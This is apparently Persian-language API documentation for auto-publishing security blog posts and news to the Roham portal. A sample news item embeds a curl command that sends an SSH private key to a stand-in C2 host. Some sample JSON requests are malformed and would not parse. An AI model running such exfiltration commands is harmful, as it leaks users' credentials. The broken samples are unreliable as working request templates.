# راهنمای اتصال هوش مصنوعی و انتشار خودکار محتوا در پرتال رهام
## Roham AI Content Ingestion & Auto-Posting REST API Specification

این مستند نحوه تعامل مستقیم اسکریپت‌ها، بات‌ها، ایجنت‌های هوش مصنوعی (مانند ChatGPT، Claude، Gemini، DeepSeek یا اسکریپت‌های پایتون و کرون‌جاب) با وب‌سایت رهام جهت انتشار خودکار **مقالات وبلاگ فنی** و **اخبار امنیت** را به طور کامل تشریح می‌کند.

---

### ۱. معماری و اندپوینت‌های اصلی (API Endpoints)

کلیه درخواست‌ها با متد `POST` به فایل PHP بک‌اند روی هاست ارسال می‌شوند:

- **اندپوینت اصلی ارسال و ویرایش محتوا:**
  `https://your-domain.com/api/content.php`
- **فرمت ارسال داده:** `Content-Type: application/json`
- **انکودینگ کاراکترها:** `UTF-8`

---

### ۲. احراز هویت (Authentication)

برای اینکه هوش مصنوعی بتواند بدون نیاز به لاگین دستی در مرورگر پست ارسال کند، از **کلید API اختصاصی** استفاده می‌شود. این کلید در فایل `public/api/config.php` هاست تحت متغیر `ROHAM_AI_POSTING_KEY` تعریف شده است.

ارسال کلید به دو روش امکان‌پذیر است:
1. **روش استاندارد (هدر HTTP):**
   ```http
   X-API-KEY: roham_ai_publisher_secret_key_2026_xyz
   ```
2. **ارسال درون بدنه JSON:**
   ```json
   {
     "api_key": "roham_ai_publisher_secret_key_2026_xyz",
     "action": "save_blog",
     ...
   }
   ```

*(نکته: می‌توانید مقدار `ROHAM_AI_POSTING_KEY` را در فایل `public/api/config.php` به هر رشته تصادفی و امنی که مایلید تغییر دهید).*

---

### ۳. ساختار دسته‌بندی‌ها (Categories)

هر پست و هر خبر **حتماً باید در یکی از دسته‌بندی‌های سایت** قرار گیرد. لیست پیش‌فرض دسته‌بندی‌ها به شرح زیر است (همچنین می‌توانید دسته‌بندی‌های جدید را از پنل ادمین اضافه یا با اندپوینت `save_category` بسازید):

| شناسه (`categoryId`) | نام دسته‌بندی (فارسی) | کاربرد |
|---|---|---|
| `supply-chain` | حملات زنجیره تامین (Supply Chain) | وبلاگ و اخبار |
| `social-engineering` | مهندسی اجتماعی و فیشینگ | وبلاگ و اخبار |
| `vulnerabilities-exploits` | تحلیل آسیب‌پذیری و اکسپلویت | وبلاگ و اخبار |
| `writeups-research` | گزارش‌های فنی و رایت‌آپ | وبلاگ و اخبار |
| `malware-infostealers` | بدافزارها و استیلرها | وبلاگ و اخبار |
| `cloud-infrastructure` | امنیت ابری و زیرساخت | وبلاگ و اخبار |
| `security-alerts` | اخبار و هشدارهای فوری | اخبار امنیت |

---

### ۴. متد ۱: انتشار مقاله وبلاگ تخصصی (`save_blog`)

ساختار یک مقاله استاندارد وبلاگ دقیقاً مشابه مقالات کالبدشکافی عمیق است:

#### درخواست نمونه:
```http
POST /api/content.php HTTP/1.1
Host: roham.org
Content-Type: application/json
X-API-KEY: roham_ai_publisher_secret_key_2026_xyz

{
  "action": "save_blog",
  "post": {
    "id": "post-ai-1740000001",
    "slug": "stealer-app-bound-encryption-bypass-analysis",
    "title": "کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption در استیلرهای ۲۰۲۶",
    "subtitle": "چگونه توسعه‌دهندگان بدافزار مکانیزم جدید محافظت از کوکی‌های کرومیوم را دور می‌زنند؟",
    "summary": "واکاوی فنی آسیب‌پذیری‌های ارتقای دسترسی محلی (LPE) و تزریق به پردازه‌های مورد اعتماد کروم جهت استخراج کوکی‌های نشست بدون نیاز به کلید DPAPI سیستمی.",
    "category": "بدافزارها و استیلرها",
    "categoryId": "malware-infostealers",
    "difficulty": "تخصصی (Deep-Dive)",
    "readTime": "۱۱ دقیقه",
    "date": "فروردین ۱۴۰۵",
    "author": "واحد تحلیل بدافزار رهام (AI Assisted)",
    "authorRole": "Roham Threat Research Labs",
    "status": "published",
    "isFeatured": true,
    "views": 0,
    "keywords": [
      "AppBoundEncryption",
      "Chromium",
      "Infostealer",
      "ProcessInjection",
      "SessionHijacking"
    ],
    "tldr": [
      "تکنیک‌های قدیمی DPAPI در نسخه‌های جدید کروم با محافظت مبتنی بر سرویس سیستم جایگزین شده‌اند.",
      "استیلرهای نوظهور با تکنیک تزریق کد به فرآیند مرورگر مجاز کلید رمزنگاری را در حافظه به دست می‌آورند.",
      "جداسازی پردازه‌ها و نظارت بر IPC تنها راه موثر پایش این کلاس از حملات است."
    ],
    "content": {
      "intro": "در سال‌های اخیر، سرقت سشن‌ها و کوکی‌های مرورگر به سودآورترین بردار نفوذ برای مجرمان سایبری تبدیل شده است...",
      "sections": [
        {
          "id": "sec-1",
          "heading: "۱. بررسی معماری حفاظتی کروم",
          "paragraphs": [
            "کروم در نسخه‌های اخیر کلید رمزگذاری پایگاه‌داده کوکی‌ها را به یک سرویس سیستمی مجزا منتقل کرده است.",
            "> توجه: دسترسی مستقیم به فایل SQLite دیگر برای خواندن داده‌های رمزشده کافی نیست."
          ],
          "codeSnippet": "Get-ItemProperty -Path 'HKLM:\\Software\\Google\\Chrome'",
          "codeLanguage": "powershell",
          "callout": "هشدار امنیتی: هرگونه فراخوانی غیرعادی APIهای ایجاد پردازه باید توسط EDR مانیتور شود.",
          "calloutType": "warning"
        },
        {
          "id": "sec-2",
          "heading: "۲. تکنیک تزریق به حافظه پردازه",
          "paragraphs": [
            "بد‌افزارها با استفاده از APIهای استاندارد ویندوز تلاش می‌کنند در بستر پردازه مرورگر اجرا شوند."
          ]
        }
      ],
      "conclusion": "دفاع در برابر استیلرهای مدرن نیازمند معماری Zero-Trust و محافظت بلادرنگ از نشست‌های کاربری است.",
      "actionableTakeaways": [
        "فعال‌سازی سیاست محدودسازی دسترسی به دایرکتوری User Data مرورگرها",
        "کوتاه کردن طول عمر کوکی‌های احراز هویت و استفاده از DPoP"
      ],
      "references": [
        {
          "title": "Chromium Security Architecture Whitepaper",
          "url": "https://www.chromium.org/Home/chromium-security/"
        }
      ]
    }
  }
}
```

---

### ۵. متد ۲: انتشار خبر امنیت (`save_news`)

ساختار اخبار امنیت **دقیقاً مشابه ساختار مقالات وبلاگ** است، با این تفاوت که چک‌لیست عملیاتی ندارد و در انتهای آن کلیدواژه‌ها (Keywords) قرار می‌گیرند:

#### درخواست نمونه:
```http
POST /api/content.php HTTP/1.1
Host: roham.org
Content-Type: application/json
X-API-KEY: roham_ai_publisher_secret_key_2026_xyz

{
  "action": "save_news",
  "article": {
    "id": "news-ai-1740000002",
    "slug": "critical-supply-chain-npm-backdoor-alert",
    "title": "هشدار فوری: کشف پکیج مسموم با قابلیت سرقت سشن‌های SSH در مخزن NPM",
    "subtitle": "حمله زنجیره تامین گسترده علیه توسعه‌دهندگان وب‌سایت‌های سازمانی",
    "summary": "محققان امنیتی یک بسته مخرب را شناسایی کردند که بلافاصله پس از نصب، کلیدهای خصوصی SSH و توکن‌های ورود گیت‌هاب را به سرور C2 ارسال می‌کند.",
    "category": "حملات زنجیره تامین (Supply Chain)",
    "categoryId": "supply-chain",
    "categoryLabel": "حملات زنجیره تامین (Supply Chain)",
    "severity": "CRITICAL",
    "status": "published",
    "isBreaking": true,
    "date": "امروز - ۱۲:۳۰",
    "readTime": "۴ دقیقه",
    "author": "مرکز عملیات امنیت رهام (SOC)",
    "source": "BleepingComputer",
    "sourceUrl": "https://www.bleepingcomputer.com/news/security/",
    "views": 0,
    "keywords": [
      "SupplyChain",
      "NPM",
      "SSH_Keys",
      "GitHub_Token",
      "CriticalAlert"
    ],
    "tldr": [
      "پکیج مخرب بیش از ۵۰ هزار بار در طول ۲۴ ساعت گذشته دانلود شده است.",
      "کد مخرب به صورت Obfuscated در فایل install.js جاسازی شده بود.",
      "کلیه توکن‌های گیت‌هاب ایجاد شده در ماشین قربانی باید فوراً باطل گردند."
    ],
    "content": {
      "intro": "گزارش‌های جدید آزمایشگاه‌های امنیتی نشان می‌دهد یک عامل تهدید پیشرفته با انتشار بسته‌ای به ظاهر بی‌خطر در اکوسیستم NPM...",
      "sections": [
        {
          "id": "sec-1",
          "heading: "۱. جزئیات بسته مخرب و نحوه فعال‌سازی",
          "paragraphs": [
            "حمله از طریق اسکریپت postinstall آغاز شده و در حین فرآیند `npm install` کلیدهای خصوصی پوشه `~/.ssh` را جستجو می‌کند."
          ],
          "codeSnippet": "curl -s -X POST https://malicious-c2-node.net/drop -d @id_rsa",
          "codeLanguage": "bash"
        }
      ],
      "conclusion": "توصیه می‌شود مدیران DevSecOps فرآیند بررسی هش پکیج‌ها (Lockfile Integrity) را در خطوط لوله CI/CD اجباری نمایند."
    },
    "sections": []
  }
}
```

---

### ۶. نمونه کدهای اتصال برای توسعه‌دهندگان

#### نمونه پایتون (Python 3):
```python
import requests

API_URL = "https://your-domain.com/api/content.php"
API_KEY = "roham_ai_publisher_secret_key_2026_xyz"

headers = {
    "Content-Type": "application/json; charset=utf-8",
    "X-API-KEY": API_KEY,
}

post_data = {
    "action": "save_news",
    "article": {
        "id": f"news-{int(requests.utils.time.time())}",
        "slug": "ai-generated-security-bulletin",
        "title": "عنوان گزارش خبری تولید شده توسط هوش مصنوعی",
        "subtitle": "زیرعنوان تحلیلی و چکیده خبر",
        "summary": "خلاصه دوخطی خبر جهت نمایش در کارت‌های صفحه اصلی...",
        "category": "تحلیل آسیب‌پذیری و اکسپلویت",
        "categoryId": "vulnerabilities-exploits",
        "severity": "HIGH",
        "status": "published",
        "isBreaking": False,
        "date": "امروز",
        "readTime": "۵ دقیقه",
        "author": "ربات هوشمند رصد تهدیدات رهام",
        "source": "Roham Threat Radar",
        "views": 0,
        "keywords": ["ZeroDay", "Exploit", "PatchTuesday"],
        "tldr": ["یافته اول خبر", "یافته دوم خبر"],
        "content": {
            "intro": "متن مقدمه خبر...",
            "sections": [
                {
                    "heading": "۱. شرح فنی آسیب‌پذیری",
                    "paragraphs": ["پاراگراف اول متن تحلیل..."],
                }
            ],
            "conclusion": "توصیه نهایی جهت اعمال وصله امنیتی.",
        },
    },
}

response = requests.post(API_URL, json=post_data, headers=headers)
print("Response:", response.status_code, response.json())
```

#### نمونه Node.js (JavaScript / TypeScript):
```javascript
import fetch from "node-fetch";

const API_URL = "https://your-domain.com/api/content.php";
const API_KEY = "roham_ai_publisher_secret_key_2026_xyz";

async function publishNews(article) {
  const res = await fetch(API_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-API-KEY": API_KEY,
    },
    body: JSON.stringify({
      action: "save_news",
      article,
    }),
  });

  const result = await res.json();
  console.log("Publish result:", result);
}
```

#### نمونه دستور cURL:
```bash
curl -X POST "https://your-domain.com/api/content.php" \
  -H "Content-Type: application/json" \
  -H "X-API-KEY: roham_ai_publisher_secret_key_2026_xyz" \
  -d '{
    "action": "save_blog",
    "post": {
      "id": "post-sample-curl",
      "title": "تست ارسال با cURL",
      "slug": "curl-test-post",
      "summary": "تست صحت اتصال اندپوینت PHP",
      "category": "امنیت ابری و زیرساخت",
      "categoryId": "cloud-infrastructure",
      "difficulty": "متوسط",
      "readTime": "۳ دقیقه",
      "date": "امروز",
      "author": "API Script",
      "status": "published",
      "keywords": ["cURL", "API"],
      "tldr": ["پست با موفقیت ثبت شد"],
      "content": {
        "intro": "متن تستی...",
        "sections": [{ "heading": "بخش ۱", "paragraphs": ["تست پاراگراف"] }],
        "conclusion": "پایان تست"
      }
    }
  }'
```

---

### ۷. دریافت پاسخ سرور (Response Codes)

- **موفقیت (200 OK):**
  ```json
  {
    "ok": true,
    "message": "مقاله با موفقیت ذخیره شد."
  }
  ```
- **کلید نامعتبر (403 Forbidden):**
  ```json
  {
    "ok": false,
    "error": "دسترسی غیرمجاز: فقط مدیر ارشد یا ربات‌های مجاز با کلید API می‌توانند محتوا منتشر کنند."
  }
  ```
- **داده ناقص (400 Bad Request):**
  ```json
  {
    "ok": false,
    "error": "اطلاعات مقاله ناقص است."
  }
  ```
